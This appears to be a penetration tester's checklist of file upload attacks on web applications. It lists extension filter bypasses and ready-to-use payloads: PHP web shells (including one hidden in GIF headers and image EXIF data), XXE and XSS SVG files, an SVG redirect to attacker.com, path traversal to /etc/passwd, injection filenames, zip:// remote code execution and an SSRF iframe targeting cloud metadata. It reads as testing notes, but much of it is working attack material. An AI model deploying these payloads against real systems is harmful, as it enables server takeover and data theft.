# File upload !

When you have file upload functionality these types of vulnerabilities are possible:

- **The flow**
    - Test all file Extension
    - you can not upload .php file make it PhP
    - make it test.jpg.php → check the existence of jpg
    - your delimiters (null byte and more)
    - 

[Vulnerabilities](File%20upload/Vulnerabilities.md)

[File Upload Bypasses](File%20upload/File%20Upload%20Bypasses.md)


- **Complete guide :**
    - Extensions Impact
        - `ASP,` `ASPX`, `PHP5`, `PHP`, `PHP3`: **Webshell RCE**
        - `SVG`: **Stored XSS, SSRF, XXE**
        - `GIF`: **Stored XSS, SSRF**
        - `CSV`: **CSV injection**
        - `XML`: **XXE**
        - `AVI`: **LFI, SSRF**
        - `HTML:` **Html injection, XSS, open redirect**
        - `PNG`, `JPEG`: **Pixel flood Attack / metadata leakage / s-s-i in its name**
        - `ZIP`: **RCE via LFI, DoS**
        - `PDF`, `PPTX`: **SSRF, Blind XXE**
    - Blacklisting Bypass
        - PHP → .`phtm` , `phtml` , .`phps` , .`pht` , .`php2` , .`php3` , .`php4` , .`php5` , .`shtml` , .`phar` , .`pgif` , .`inc`
        - ASP → `asp` , .`aspx` , .`cer` , .`asa`
        - Jsp → .`jsp` , .`jspx` , .`jsw` , .`jsv` , .`jspf`
        - Coldfusion → .`cfm` , .`cfml` , .`cfc` , .`dbm`
        - Using random capitalization → .`pHp` , .`pHP5` , .`PhAr`
    - Whitelisting Bypass
        - `file.jpg.php`
        - `file.php.jpg`
        - `file.php.blah123jpg`
        - `file.php%00.jpg`
        - `file.php\x00.jp`g this can be done while uploading the file too, name it file.phpD.jpg and change the D (44) in
        
        hex to 00.
        
        - `file.php%00`
        - `file.php%20`
        - `file.php%0d%0a.jpg`
        - `file.php.....`
        - `file.php/`
        - `file.php.\`
        - `file.`
        - `.html`
    - Vulnerabilities
        - [ ]  Directory Traversal
        1. Set filename 
        2. Set filename `../../../logo.png` as it might changed the website logo.
        - [ ]  SQL Injection
        1. Set filename `'sleep(10).jpg`.
        2. Set filename `sleep(10)-- -.jpg` .
        - [ ]  Command Injection
        1. Set filename 
        - [ ]  XXE
        1. Upload using `.svg` file
        
        ```bash
        <?xml version="1.0" standalone="yes"?>
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
        <svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1
        <text font-size="40" x="0" y="16">&xxe;</text>
        </svg>
        ```
        
        1. Upload excel file
        - [ ]  XSS
        1. Set file name `<svg onload=alert(document.comain)>`
        2. Upload using .`svg` file
        
        ```bash
        <?xml version="1.0" standalone="no"?>
        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
        File Upload Checklist3<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
        <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
        <script type="text/javascript">
        alert("HolyBugx XSS");
        </script>
        </svg>
        ```
        
        - [ ]  Open Redirect
        1. Upload using .svg file
        
        ```bash
        	<code>
        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <svg
        onload="window.location='https://attacker.com'"
        xmlns="http://www.w3.org/2000/svg">
        <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
        </svg>
        </code>
        ```
        
    - Content-ish Bypass
        - [ ]  Content-type validation
        1. Upload `file.php` and change the `Content-type: application/x-php` or `Content-Type : application/octet-stream` to `Content-type: image/png` or `Content-type: image/gif` or `Content-type: image/jpg`.
        - [ ]  Content-Length validation
        1. Small PHP Shell
        
        ```bash
        (<?=`$_GET[x]`?>)
        ```
        
        - [ ]  Content Bypass Shell
        1. If they check the Content. Add the text "GIF89a;" before you shell-code. ( `Content-type: image/gif` )
        
        ```bash
        GIF89a; <?php system($_GET['cmd']); ?>
        ```
        
    - Misc
        - [ ]  Uploading `file.js` & `file.config` (web.config)
        - [ ]  Pixel flood attack using image
        - [ ]  DoS with a large values name:
        - [ ]  Zip Slip
        1. If a site accepts .zip file, upload .php and compress it into .zip and upload it. Now visit, site.com/path?page=zip://path/file.zip%23rce.php
        - [ ]  Image Shell
        1. Exiftool is a great tool to view and manipulate exif-data. Then I will to rename the file mv pic.jpg pic.php.jpg
        
        ```bash
        exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
        ```
        
- The webapp is php based and the file you upload is accessible
- bypass the restrictions ( well be discussed )
- **File overwrite**
    - Create a system file like /etc/passwd
    - Upload the file and Capture the request
    - Modify the the request by changing the **filename parameter** to **../../../../../etc/passwd**
- **Path Traversal** = is the same as above but not system files
- **Large File DoS**
    - make an img file with size of 500mb
    - Upload it and check it out it accepts or not
- **Server-Side Injection (Sql inj & Os command)**
    - Upload your file and capture the request
    - change its name to name=test.png —> name=sleep(10)— -.png (for SQL)
    - change its name to name=test.png —> name=test;sleep(9);.png (for OS Injection)
    - It is Also possible to test XSS
- **Metadata Leakage**
    - As known, EXIF Metadata Leakage/Information Leakage
    - Not all of ‘em are vulnerable, and not images are vulnerable yet PDFs upload are too!
    - Upload your image, and click on the uploaded image COPY its link
    - Now, use [this site](http://exif.regex.info/exif.cgi)  to check the image for EXIF data leakage.
    - This GitHub repository is might be useful https://github.com/ianare/exif-samples
- Pixel Flood Attack
    - An Attacker can upload an image with a large pixel size that results in DoS
    - To test, navigate to [https://www.resizepixel.com](https://www.resizepixel.com) and resize an image with 64250*64550px.
    - Upload the image, and observe the server’s response.
    - If the server takes too long to respond or if the application became inaccessible, confirm with another device
- **Cross Site Scripting (XSS)**
    - XSS via SVG file upload
        - Create an SVG file containing a cross-site scripting payload (PayloadAllTheThings)
        - Upload the file
        - open the SVG file or Go to the endpoint that calls the SVG file
    - XSS via Image Name
        - Create any file, e.g. a PNG file and name it with XSS payload like the following
        - <script>alert(origin)</script>.png
        - Upload your file and Go to the endpoint that calls the files or stores the files
        
- **CSV injection**
    - I will read about it
- **Open Redirect**
    - application allows to upload an HTML file, and we XXS is limited
    - but the file renders not download and locally renders
    - I will read about it
- **SSRF**
    - SSRF vial html uplaod
        - if webapp allows html upload and js code are limited
        - upload an HTML file containing a malicious `iframe`, `src`, `srcdoc`, `script`
        - file contains the code’s bellow
        
        ```bash
        <body>
        	<iframe src="http://169.254.169.254/latest/meta-data" ></ifram>
        </body>
        ```
        
        - upload it, and open it up https://amir.com/uploaded/ssrf.html
    - SSRC in File Upload through URL:
        - you have a functionality to upload a file through a link
        - Fuzz the endpoint with the internal SSRF Payloads
- **XML External Entities**
    - Trough SVG file Upload
        - create a file containing a malicious xml codes
        - Upload and Open it